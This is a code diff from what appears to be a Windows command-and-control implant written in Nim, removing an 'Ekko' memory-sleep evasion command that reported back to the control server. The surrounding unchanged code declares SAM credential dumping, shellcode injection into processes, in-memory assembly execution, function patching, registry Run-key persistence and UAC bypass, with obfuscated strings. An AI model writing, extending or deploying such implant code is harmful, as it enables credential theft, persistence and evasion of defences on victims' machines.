@@ -1,7 +1,6 @@
 # Internal imports
 import ../config
 import ../common
-import utils/incl/cfg
 import utils/[audio, clipboard, clr, helpers, memops, misc, screenshot]
 # Internal imports
 import std/[tables, nativesockets, json]
@@ -33,7 +32,6 @@ proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
 proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
 proc wrap_patch_func(func_name: string): bool
-proc change_memsleep(technique: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
 proc set_spe(process_name: string, cmd: string): bool
 proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
@@ -351,29 +349,6 @@ proc wrap_patch_func(func_name: string): bool =
     return is_success
 
 
-proc change_memsleep(technique: string): bool =
-    var is_success: bool
-    if technique == protectString("none"): 
-        memsleep_technique = 0
-        is_success = true
-    elif technique == protectString("ekko"):
-        if isControlFlowGuardEnabled():
-            is_success = false
-        else:
-            is_success = true
-            memsleep_technique = 1
-    else:
-        is_success = false
-    
-    var data = {
-        protectString("technique"): technique,
-        protectString("is_success"): $is_success
-    }.toOrderedTable()
-    
-    is_success = post_data(client, protectString("memsleep") , $data)
-    return is_success
-
-
 proc set_run_key(key_name: string, cmd: string): bool =
     var is_success = false
     let run_path = protectString("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
@@ -577,8 +552,6 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
         of protectString("patch"):
             is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
-        of protectString("memsleep"):
-            is_success = change_memsleep(command[protectString("memsleep_technique")].getStr())
         of protectString("persist-run"):
             is_success = set_run_key(command["key_name"].getStr(), command[protectString("persist_command")].getStr())
         of protectString("persist-spe"):
